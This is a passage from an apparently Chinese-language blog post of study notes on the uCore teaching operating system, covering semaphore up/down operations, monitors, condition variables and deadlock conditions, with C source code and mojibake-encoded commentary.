class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> __noinline <span class="hljs-keyword">void</span> __up(<span class="hljs-keyword">semaphore_t</span> *sem, <span class="hljs-keyword">uint32_t</span> wait_state) &#123;<br>    <span class="hljs-keyword">bool</span> intr_flag;<br>    local_intr_save(intr_flag);<br>    &#123;<span class="hljs-comment">//å±è”½ä¸­æ–­</span><br>        <span class="hljs-keyword">wait_t</span> *wait;<br>        <span class="hljs-keyword">if</span> ((wait = wait_queue_first(&amp;(sem-&gt;wait_queue))) == <span class="hljs-literal">NULL</span>) <br>        &#123;<span class="hljs-comment">//æ„å‘³ç€æ²¡æœ‰ç­‰å¾…çš„è¿›ç¨‹</span><br>            sem-&gt;value ++;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//å¦åˆ™è¦å”¤é†’</span><br>            wakeup_wait(&amp;(sem-&gt;wait_queue), wait, wait_state, <span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br>    local_intr_restore(intr_flag);<br><br></code></pre></div></td></tr></table></figure><h4 id="down-Pæ“ä½œ"><a href="#down-Pæ“ä½œ" class="headerlink" title="__down(): Pæ“ä½œ"></a>__down(): Pæ“ä½œ</h4><p><img src="../../image/ucore/down.gif" alt="down"></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> __noinline <span class="hljs-keyword">uint32_t</span> __down(<span class="hljs-keyword">semaphore_t</span> *sem, <span class="hljs-keyword">uint32_t</span> wait_state) &#123;<br>    <span class="hljs-comment">//realize P operation</span><br>    <span class="hljs-keyword">bool</span> intr_flag;<br>    local_intr_save(intr_flag);<span class="hljs-comment">//save the interrupt flag</span><br>    <span class="hljs-keyword">if</span> (sem-&gt;value &gt; <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">//èƒ½å¤Ÿè·å–ä¿¡å·é‡</span><br>        sem-&gt;value --;<br>        local_intr_restore(intr_flag);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-comment">//æ— æ³•è·å¾—ä¿¡å·é‡æ—¶:</span><br>    <span class="hljs-keyword">wait_t</span> __wait, *wait = &amp;__wait;<br>    wait_current_set(&amp;(sem-&gt;wait_queue), wait, wait_state); <span class="hljs-comment">//åŠ å…¥ç­‰å¾…é˜Ÿåˆ—</span><br>    local_intr_restore(intr_flag);<span class="hljs-comment">//å…³ä¸­æ–­</span><br><br>    schedule();<span class="hljs-comment">//é€‰æ‹©å¦ä¸€ä¸ªè¿›ç¨‹æ‰§è¡Œ</span><br><br>    local_intr_save(intr_flag);<span class="hljs-comment">//å¦‚æœè¢«å¦ä¸€ä¸ªVæ“ä½œ(upå‡½æ•°)å”¤é†’, ç»§ç»­æ‰§è¡Œ</span><br>    wait_current_del(&amp;(sem-&gt;wait_queue), wait);<span class="hljs-comment">//ä»waité˜Ÿåˆ—ä¸­åˆ é™¤</span><br>    local_intr_restore(intr_flag);<br><br>    <span class="hljs-keyword">if</span> (wait-&gt;wakeup_flags != wait_state) &#123;<br>        <span class="hljs-keyword">return</span> wait-&gt;wakeup_flags;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="3-ä¿¡å·é‡"><a href="#3-ä¿¡å·é‡" class="headerlink" title="3.ä¿¡å·é‡"></a>3.ä¿¡å·é‡</h3><p>ä¿¡å·é‡çš„æ•°æ®ç»“æ„å®šä¹‰å¦‚ä¸‹:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-keyword">int</span> value;                   <span class="hljs-comment">//ä¿¡å·é‡çš„å½“å‰å€¼</span><br>    <span class="hljs-keyword">wait_queue_t</span> wait_queue;     <span class="hljs-comment">//ä¿¡å·é‡å¯¹åº”çš„ç­‰å¾…é˜Ÿåˆ—</span><br>&#125; <span class="hljs-keyword">semaphore_t</span>;<br></code></pre></div></td></tr></table></figure><p>__up()å’Œ__down()çš„åˆ†æåœ¨ä¸Šé¢.</p><p>å¯¹ç…§ä¿¡å·é‡çš„åŸç†æ€§æè¿°å’Œå…·ä½“å®ç°ï¼Œå¯ä»¥å‘ç°äºŒè€…åœ¨æµç¨‹ä¸ŠåŸºæœ¬ä¸€è‡´ï¼Œåªæ˜¯å…·ä½“å®ç°é‡‡ç”¨äº†å…³ä¸­æ–­çš„æ–¹å¼ä¿è¯äº†å¯¹å…±äº«èµ„æºçš„äº’æ–¥è®¿é—®ï¼Œé€šè¿‡ç­‰å¾…é˜Ÿåˆ—è®©æ— æ³•è·å¾—ä¿¡å·é‡çš„è¿›ç¨‹ç¡çœ ç­‰å¾…ã€‚</p><h3 id="4-ç®¡ç¨‹-monitor-å’Œæ¡ä»¶å˜é‡"><a href="#4-ç®¡ç¨‹-monitor-å’Œæ¡ä»¶å˜é‡" class="headerlink" title="4.ç®¡ç¨‹(monitor)å’Œæ¡ä»¶å˜é‡"></a>4.ç®¡ç¨‹(monitor)å’Œæ¡ä»¶å˜é‡</h3><blockquote><p><a href="https://kiprey.github.io/2020/09/uCore-7/#5-%E7%AE%A1%E7%A8%8B">åŸç†</a> </p></blockquote><p>ucoreä¸­çš„ç®¡ç¨‹æœºåˆ¶æ˜¯åŸºäºä¿¡å·é‡å’Œæ¡ä»¶å˜é‡æ¥å®ç°çš„ã€‚ucoreä¸­çš„ç®¡ç¨‹çš„æ•°æ®ç»“æ„monitor_tå®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">monitor</span>&#123;</span><br>    <span class="hljs-keyword">semaphore_t</span> mutex;<span class="hljs-comment">// the mutex lock for going into the routines in monitor, should be initialized to 1</span><br>    <span class="hljs-comment">// the next semaphore is used to </span><br>    <span class="hljs-comment">//    (1) procs which call cond_signal funciton should DOWN next sema after UP cv.sema</span><br>    <span class="hljs-comment">// OR (2) procs which call cond_wait funciton should UP next sema before DOWN cv.sema</span><br>    <span class="hljs-keyword">semaphore_t</span> next;        <br>    <span class="hljs-keyword">int</span> next_count;         <span class="hljs-comment">// the number of of sleeped procs which cond_signal funciton</span><br>    <span class="hljs-keyword">condvar_t</span> *cv;          <span class="hljs-comment">// the condvars(æ˜¯ä¸€ä¸ªarray) in monitor</span><br>&#125; <span class="hljs-keyword">monitor_t</span>;<br></code></pre></div></td></tr></table></figure><p>Since a signaling process must wait until the resumed process either leaves or waits, an additional binary semaphore, next, is introduced, initialized to 0. ==The signaling processes can use next to suspend themselves==. An integer variable next count is also provided to count the number of processes suspended on next. </p><p>ç®¡ç¨‹ä¸­çš„æ¡ä»¶å˜é‡çš„æ•°æ®ç»“æ„condvar_tå®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">condvar</span>&#123;</span><br><span class="hljs-comment">// the sem semaphore is used to down the waiting proc, and the signaling proc should up the waiting proc</span><br>    <span class="hljs-keyword">semaphore_t</span> sem;     <br>    <span class="hljs-keyword">int</span> count;       ã€€    <span class="hljs-comment">// the number of waiters on condvar</span><br>    <span class="hljs-keyword">monitor_t</span> * owner;     <span class="hljs-comment">// the owner(monitor) of this condvar</span><br>&#125; <span class="hljs-keyword">condvar_t</span>;<br></code></pre></div></td></tr></table></figure><p>æ¡ä»¶å˜é‡çš„å®šä¹‰ä¸­ä¹ŸåŒ…å«äº†ä¸€ç³»åˆ—çš„æˆå‘˜å˜é‡ï¼Œä¿¡å·é‡semç”¨äºè®©å‘å‡º<code>wait_cv</code>æ“ä½œçš„ç­‰å¾…æŸä¸ªæ¡ä»¶Condä¸ºçœŸçš„è¿›ç¨‹ç¡çœ ï¼Œè€Œè®©å‘å‡º<code>signal_cv</code>æ“ä½œçš„è¿›ç¨‹é€šè¿‡è¿™ä¸ªsemæ¥å”¤é†’ç¡çœ çš„è¿›ç¨‹, <strong>å¯ä»¥çœ‹å‡ºæ¡ä»¶å˜é‡æ˜¯ä¿¡å·é‡çš„é«˜å±‚å°è£….</strong> </p><p>è¦çœ‹æ‡‚monitorè¿˜å¯ä»¥çœ‹çœ‹ä»–çš„åˆå§‹åŒ–å‡½æ•°:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// Initialize monitor.</span><br><span class="hljs-keyword">void</span>  <span class="hljs-comment">//monitorä¸­çš„cvå…¶å®æ˜¯ä¸€ä¸ªæ•°ç»„å¤´, å¤§å°æ˜¯è¿™ä¸ªå‡½æ•°çš„num_cvå‚æ•°, èƒ½å­˜æ”¾å¤šä¸ªæ¡ä»¶å˜é‡, è¿™æ ·æ–¹ä¾¿ç®¡ç¨‹æ§åˆ¶</span><br>monitor_init (<span class="hljs-keyword">monitor_t</span> * mtp, <span class="hljs-keyword">size_t</span> num_cv) &#123;<br>    <span class="hljs-keyword">int</span> i;<br>    assert(num_cv&gt;<span class="hljs-number">0</span>);<br>    mtp-&gt;next_count = <span class="hljs-number">0</span>;<br>    mtp-&gt;cv = <span class="hljs-literal">NULL</span>;<br>    sem_init(&amp;(mtp-&gt;mutex), <span class="hljs-number">1</span>); <span class="hljs-comment">//unlocked</span><br>    sem_init(&amp;(mtp-&gt;next), <span class="hljs-number">0</span>);<span class="hljs-comment">//æ³¨æ„åˆ°è¿™ä¸¤ä¸ªçš„åˆå§‹åŒ–å¹¶ä¸ä¸€è‡´, nextä¸€å¼€å§‹æ˜¯ç©ºçš„</span><br>    mtp-&gt;cv =(<span class="hljs-keyword">condvar_t</span> *)kmalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">condvar_t</span>)*num_cv);<br>    assert(mtp-&gt;cv!=<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;num_cv; i++)&#123;<span class="hljs-comment">//åˆå§‹åŒ–æ¡ä»¶å˜é‡</span><br>        mtp-&gt;cv[i].count=<span class="hljs-number">0</span>;<br>        sem_init(&amp;(mtp-&gt;cv[i].sem),<span class="hljs-number">0</span>);<br>        mtp-&gt;cv[i].owner=mtp;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>ucoreè®¾è®¡å®ç°äº†æ¡ä»¶å˜é‡<code>wait_cv</code>æ“ä½œå’Œ<code>signal_cv</code>æ“ä½œå¯¹åº”çš„å…·ä½“å‡½æ•°ï¼Œå³<code>cond_wait</code>å‡½æ•°å’Œ<code>cond_signal</code>å‡½æ•°ï¼Œæ­¤å¤–è¿˜æœ‰<code>cond_init</code>åˆå§‹åŒ–å‡½æ•°ï¼ˆå¯ç›´æ¥çœ‹æºç ï¼‰</p><p><strong>signal_cvçš„åŸç†æè¿°</strong></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span>( cv.count &gt; <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">//å¦‚æœè¯¥cvä¸Šæ²¡æœ‰ç­‰å¾…çš„è¿›ç¨‹, ç›´æ¥è·³è¿‡</span><br>   monitor.next_count ++;<span class="hljs-comment">//å¦åˆ™next_count++</span><br>   sem_signal(cv.sem);<span class="hljs-comment">//å”¤é†’é˜Ÿåˆ—ä¸­ç¬¬ä¸€ä¸ªè¿›ç¨‹</span><br>   sem_wait(monitor.next);<span class="hljs-comment">//ä¸€å¼€å§‹çš„æ—¶å€™next.value=0, å½“å‰è¿›ç¨‹è‚¯å®šä¼šè¢«æŒ‚èµ·å¹¶schedule();</span><br>                            <span class="hljs-comment">//åæ¥(???</span><br>   monitor.next_count -- ;<span class="hljs-comment">//è¢«å”¤é†’åå°±å‡æ‰äº†</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>å®é™…ä»£ç æ˜¯å·®ä¸å¤šçš„:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(cvp-&gt;count&gt;<span class="hljs-number">0</span>) &#123;<br>    cvp-&gt;owner-&gt;next_count ++;<br>    up(&amp;(cvp-&gt;sem));<br>    down(&amp;(cvp-&gt;owner-&gt;next));<br>    cvp-&gt;owner-&gt;next_count --;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><strong>wait_cvçš„åŸç†æè¿°</strong> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">cv.count++;<span class="hljs-comment">//ç­‰å¾…æ•°é‡+1</span><br><span class="hljs-keyword">if</span>(monitor.next_count &gt; <span class="hljs-number">0</span>)<span class="hljs-comment">//æœ‰å¤§äºç­‰äº1ä¸ªè¿›ç¨‹æ‰§è¡Œcond_signalå‡½æ•°ä¸”sleep</span><br>   sem_signal(monitor.next);<span class="hljs-comment">//å”¤é†’wait_queueç¬¬ä¸€ä¸ªè¿›ç¨‹</span><br><span class="hljs-keyword">else</span><span class="hljs-comment">//æ²¡æœ‰è¿›ç¨‹å› æ‰§è¡Œcond_signalè€ŒæŒ‚èµ·</span><br>   sem_signal(monitor.mutex);<span class="hljs-comment">//è§£å¼€äº’æ–¥é”, å¥½è®©å…¶ä»–è¿›ç¨‹è¿›å…¥ç®¡ç¨‹</span><br>sem_wait(cv.sem);<span class="hljs-comment">//å½“å‰è¿›ç¨‹éœ€è¦ç­‰å¾…ä¿¡å·(è§ä¸‹æ–¹)</span><br>cv.count --;<br></code></pre></div></td></tr></table></figure><blockquote><p>æœ‰ä¸€ç‚¹è¿·æƒ‘çš„åœ°æ–¹åœ¨äºç­‰å¾…ä¿¡å·æ˜¯åœ¨ç¨‹åºä¸­åˆ¤æ–­çš„å—? çœ‹ä»£ç ç¡®å®æ˜¯è¿™ä¸ªæ„æ€, åˆ°äº†sem_waitå°±ä¸€å®šä¼šç­‰å¾…(é€šè¿‡ç›¸é‚»å“²å­¦å®¶çš„æƒ…å†µæå‰signal_cv, è®¾ç½®state_condvar, ç„¶åsem_waitéƒ½ç”¨ä¸ç€åˆ¤æ–­cv.semçš„value, è‚¯å®šæ˜¯0.</p><p>æ²¡æœ‰å¼„æ¸…æ¥šä»€ä¹ˆæ˜¯å¿…é¡»å†™åœ¨æ“ä½œç³»ç»Ÿé‡Œçš„ä»€ä¹ˆæ˜¯è¦å†™åœ¨ç¨‹åºä¸­çš„</p></blockquote><p>å®é™…ä»£ç :</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">cvp-&gt;count++;<br><span class="hljs-keyword">if</span>(cvp-&gt;owner-&gt;next_count &gt; <span class="hljs-number">0</span>)<br>    up(&amp;(cvp-&gt;owner-&gt;next));<br><span class="hljs-keyword">else</span><br>    up(&amp;(cvp-&gt;owner-&gt;mutex));<br>down(&amp;(cvp-&gt;sem));<br>cvp-&gt;count --;<br></code></pre></div></td></tr></table></figure><h3 id="5-ç®¡ç¨‹ä¸­å‡½æ•°çš„å…¥å£å‡ºå£è®¾è®¡"><a href="#5-ç®¡ç¨‹ä¸­å‡½æ•°çš„å…¥å£å‡ºå£è®¾è®¡" class="headerlink" title="5.ç®¡ç¨‹ä¸­å‡½æ•°çš„å…¥å£å‡ºå£è®¾è®¡"></a>5.ç®¡ç¨‹ä¸­å‡½æ•°çš„å…¥å£å‡ºå£è®¾è®¡</h3><p>ä¸ºäº†è®©æ•´ä¸ªç®¡ç¨‹æ­£å¸¸è¿è¡Œï¼Œè¿˜éœ€åœ¨ç®¡ç¨‹ä¸­çš„æ¯ä¸ªå‡½æ•°çš„å…¥å£å’Œå‡ºå£å¢åŠ ç›¸å…³æ“ä½œï¼Œå³ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">function_in_monitor ï¼ˆâ€¦ï¼‰<br>&#123;<br>  sem.wait(monitor.mutex);<br><span class="hljs-comment">//-----------------------------</span><br>  the real body of function;<br><span class="hljs-comment">//-----------------------------</span><br>  <span class="hljs-keyword">if</span>(monitor.next_count &gt; <span class="hljs-number">0</span>)<br>     sem_signal(monitor.next);<br>  <span class="hljs-keyword">else</span><br>     sem_signal(monitor.mutex);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>è¿™æ ·å¸¦æ¥çš„ä½œç”¨æœ‰ä¸¤ä¸ªï¼Œï¼ˆ1ï¼‰åªæœ‰ä¸€ä¸ªè¿›ç¨‹åœ¨æ‰§è¡Œç®¡ç¨‹ä¸­çš„å‡½æ•°ã€‚ï¼ˆ2ï¼‰é¿å…ç”±äºæ‰§è¡Œäº†cond_signalå‡½æ•°è€Œç¡çœ çš„è¿›ç¨‹æ— æ³•è¢«å”¤é†’ã€‚</p><p>å…·ä½“æ˜¯è¿™æ ·å·¥ä½œçš„: </p><ul><li>å¦‚æœ1å·è¿›ç¨‹è¿›å…¥äº†ä¸´ç•ŒåŒº, ç„¶åç”±äºæŸç§åŸå› (æ¯”å¦‚å¤–éƒ¨ä¸­æ–­)è€Œåˆ‡æ¢åˆ°äº†å¦ä¸€ä¸ªä¹Ÿè¦è®¿é—®ç®¡ç¨‹çš„è¿›ç¨‹2å·, é‚£ä¹ˆ2å·å°±ä¼šåœ¨sem.wait()é‡Œè¢«æŒ‚èµ·æ¥, å¹¶ä¸”é€šè¿‡è°ƒåº¦æœ€ç»ˆæ¢åˆ°1å·ç»§ç»­æ‰§è¡Œ. </li><li>å½“1å·æ‰§è¡Œåˆ°å‡ºå£æ—¶, ä»–ä¼šå‘ç°next_count=0, éšåé‡Šæ”¾mutexé”, å‘ç°1å·åœ¨ç­‰å¾…mutex, æ‰€ä»¥å°†å…¶å”¤é†’, åœ¨ä¸‹ä¸€ä¸ªä¸­æ–­ä¸­, 1å·è¿›å…¥ç¡çœ , 2å·å‡†å¤‡æ‰§è¡Œ. (ä¸ä¸€å®šæ˜¯ç´§è·Ÿç€çš„, è¿˜è¦çœ‹è°ƒåº¦å™¨, è¿™é‡Œåªæ˜¯è®¾ç½®æˆäº†RUNNALBE)</li><li>2 å·æ‰§è¡Œåˆ°å‡ºå£æ—¶å‘ç°next_count=1, äºæ˜¯upä¸€ä¸‹ä¿¡å·é‡next, æœ€ç»ˆå›åˆ°ä¸€å·ç»§ç»­å¾€ä¸‹æ‰§è¡Œ.</li></ul><h3 id="6-æ­»é”"><a href="#6-æ­»é”" class="headerlink" title="6.æ­»é”"></a>6.æ­»é”</h3><blockquote><p>ä¸ç”¨å¯æƒœäº†(bushi <a href="https://kiprey.github.io/2020/09/uCore-7/#7-%E6%AD%BB%E9%94%81">[link]</a> </p></blockquote><h4 id="a-æ­»é”æ¦‚å¿µ"><a href="#a-æ­»é”æ¦‚å¿µ" class="headerlink" title="a. æ­»é”æ¦‚å¿µ"></a>a. æ­»é”æ¦‚å¿µ</h4><h5 id="1-è¿›ç¨‹è®¿é—®èµ„æºçš„æµç¨‹"><a href="#1-è¿›ç¨‹è®¿é—®èµ„æºçš„æµç¨‹" class="headerlink" title="1) è¿›ç¨‹è®¿é—®èµ„æºçš„æµç¨‹"></a>1) è¿›ç¨‹è®¿é—®èµ„æºçš„æµç¨‹</h5><ul><li>èµ„æºç±»å‹R1,R2,â€¦ï¼ŒRmR1,R2,â€¦ï¼ŒRm: CPUæ‰§è¡Œæ—¶é—´ï¼Œå†…å­˜ç©ºé—´ï¼ŒI/Oè®¾å¤‡ç­‰ã€‚</li><li>æ¯ç±»èµ„æºRiRiæœ‰WiWiä¸ªå®ä¾‹</li><li>è¿›ç¨‹è®¿é—®èµ„æºçš„æµç¨‹<ul><li>è¯·æ±‚/è·å–ï¼šç”³è¯·ç©ºé—²èµ„æº</li><li>ä½¿ç”¨/å ç”¨ï¼šè¿›ç¨‹å ç”¨èµ„æº</li><li>é‡Šæ”¾ï¼šèµ„æºçŠ¶æ€ç”±å ç”¨å˜æˆç©ºé—²ã€‚</li></ul></li></ul><h5 id="2-èµ„æºåˆ†ç±»"><a href="#2-èµ„æºåˆ†ç±»" class="headerlink" title="2) èµ„æºåˆ†ç±»"></a>2) èµ„æºåˆ†ç±»</h5><ul><li>å¯é‡ç”¨èµ„æºï¼ˆReusable Resourceï¼‰<ul><li>èµ„æºä¸èƒ½è¢«åˆ é™¤ä¸”è‡ªä»»ä½•æ—¶åˆ»åªèƒ½æœ‰ä¸€ä¸ªè¿›ç¨‹åœ¨ä½¿ç”¨</li><li>è¿›ç¨‹é‡Šæ”¾èµ„æºåï¼Œå…¶ä»–è¿›ç¨‹å¯é‡ç”¨</li><li>å¯é‡ç”¨èµ„æºç¤ºä¾‹ï¼šç¡¬ä»¶å¦‚å¤„ç†å™¨ã€I/Oè®¾å¤‡ç­‰ï¼Œè½¯ä»¶å¦‚æ–‡ä»¶ã€æ•°æ®åº“ç­‰</li><li>å¯èƒ½å‡ºç°æ­»é”ï¼šæ¯ä¸ªè¿›ç¨‹å ç”¨ä¸€éƒ¨åˆ†èµ„æºå¹¶è¯·æ±‚å…¶ä»–èµ„æº</li></ul></li><li>æ¶ˆè´¹èµ„æº (Consumable resource)<ul><li>èµ„æºåˆ›å»ºå’Œé”€æ¯</li><li>æ¶ˆè€—èµ„æºç¤ºä¾‹ï¼šä¸­æ–­ã€ä¿¡å·ã€æ¶ˆæ¯</li><li>å¯èƒ½å‡ºç°æ­»é”ï¼šè¿›ç¨‹é—´ç›¸äº’ç­‰å¾…æ¥æ”¶å¯¹æ–¹çš„æ¶ˆæ¯</li></ul></li></ul><h5 id="3-å‡ºç°æ­»é”çš„å¿…è¦æ¡ä»¶"><a href="#3-å‡ºç°æ­»é”çš„å¿…è¦æ¡ä»¶" class="headerlink" title="3) å‡ºç°æ­»é”çš„å¿…è¦æ¡ä»¶"></a>3) å‡ºç°æ­»é”çš„å¿…è¦æ¡ä»¶</h5><ul><li>äº’æ–¥ï¼šä»»ä½•æ—¶åˆ»åªèƒ½æœ‰ä¸€ä¸ªè¿›ç¨‹ä½¿ç”¨ä¸€ä¸ªèµ„æºå®ä¾‹</li><li>æŒæœ‰å¹¶ç­‰å¾…ï¼šè¿›ç¨‹ä¿æŒè‡³å°‘ä¸€ä¸ªèµ„æºï¼Œå¹¶æ­£åœ¨ç­‰å¾…è·å–å…¶ä»–è¿›ç¨‹æŒæœ‰çš„èµ„æº</li><li>éæŠ¢å ï¼šèµ„æºåªèƒ½åœ¨è¿›ç¨‹ä½¿ç”¨åè‡ªæ„¿é‡Šæ”¾</li><li>å¾ªç¯ç­‰å¾…ï¼šè¿›ç¨‹é—´ç›¸äº’å¾ªç¯ç­‰å¾…</li></ul><h4 id="b-æ­»é”å¤„ç†æ–¹æ³•"><a href="#b-æ­»é”å¤„ç†æ–¹æ³•" class="headerlink" title="b. æ­»é”å¤„ç†æ–¹æ³•"></a>b. æ­»é”å¤„ç†æ–¹æ³•</h4><blockquote><p>æ­»é”æ£€æµ‹è¾ƒä¸ºå¤æ‚ï¼Œé€šå¸¸ç”±åº”ç”¨ç¨‹åºå¤„ç†æ­»é”ï¼Œ<strong>æ“ä½œç³»ç»Ÿä¼šå¿½ç•¥æ­»é”</strong> </p></blockquote><h5 id="1-æ­»é”é¢„é˜²"><a href="#1-æ­»é”é¢„é˜²" class="headerlink" title="1) æ­»é”é¢„é˜²"></a>1) æ­»é”é¢„é˜²</h5><blockquote><p>æ­»é”é¢„é˜²ï¼ˆDeadlock Prevention) ï¼š ç¡®ä¿ç³»ç»Ÿæ°¸è¿œä¸ä¼šè¿›å…¥æ­»é”çŠ¶æ€ã€‚</p></blockquote><p>é¢„é˜²æ˜¯é‡‡ç”¨æŸç§ç­–ç•¥ï¼Œ<strong>é™åˆ¶</strong>å¹¶å‘è¿›ç¨‹å¯¹èµ„æºçš„è¯·æ±‚ï¼Œä½¿ç³»ç»Ÿåœ¨ä»»ä½•æ—¶åˆ»éƒ½<strong>ä¸æ»¡è¶³æ­»é”çš„å¿…è¦æ¡ä»¶</strong>ã€‚</p><ul><li>äº’æ–¥ï¼šæŠŠäº’æ–¥çš„å…±äº«èµ„æºå°è£…æˆå¯åŒæ—¶è®¿é—®çš„</li><li>æŒæœ‰å¹¶ç­‰å¾…ï¼šè¿›ç¨‹è¯·æ±‚èµ„æºæ—¶ï¼Œè¦æ±‚å®ƒä¸æŒæœ‰ä»»ä½•å…¶ä»–èµ„æºã€‚ä»…å…è®¸è¿›ç¨‹åœ¨å¼€å§‹æ‰§è¡Œæ—¶ï¼Œä¸€æ¬¡è¯·æ±‚æ‰€æœ‰éœ€è¦çš„èµ„æºï¼Œä½†è¿™ç§åšæ³•çš„èµ„æºåˆ©ç”¨ç‡ä½ã€‚</li><li>éæŠ¢å ï¼šå¦‚è¿›ç¨‹è¯·æ±‚ä¸èƒ½ç«‹å³åˆ†é…çš„èµ„æºï¼Œåˆ™é‡Šæ”¾å·²ç»å ç”¨çš„èµ„æºã€‚åªåœ¨èƒ½å¤ŸåŒæ—¶è·å¾—æ‰€æœ‰éœ€è¦èµ„æºæ—¶ï¼Œæ‰æ‰§è¡Œåˆ†é…æ“ä½œã€‚</li><li>å¾ªç¯ç­‰å¾…ï¼šå¯¹èµ„æºæ’åºï¼Œè¦æ±‚è¿›ç¨‹æŒ‰é¡ºåºè¯·æ±‚èµ„æºã€‚</li></ul><h5 id="2-æ­»é”é¿å…"><a href="#2-æ­»é”é¿å…" class="headerlink" title="2) æ­»é”é¿å…"></a>2) æ­»é”é¿å…</h5><blockquote><p>æ­»é”é¿å…ï¼ˆDeadlock 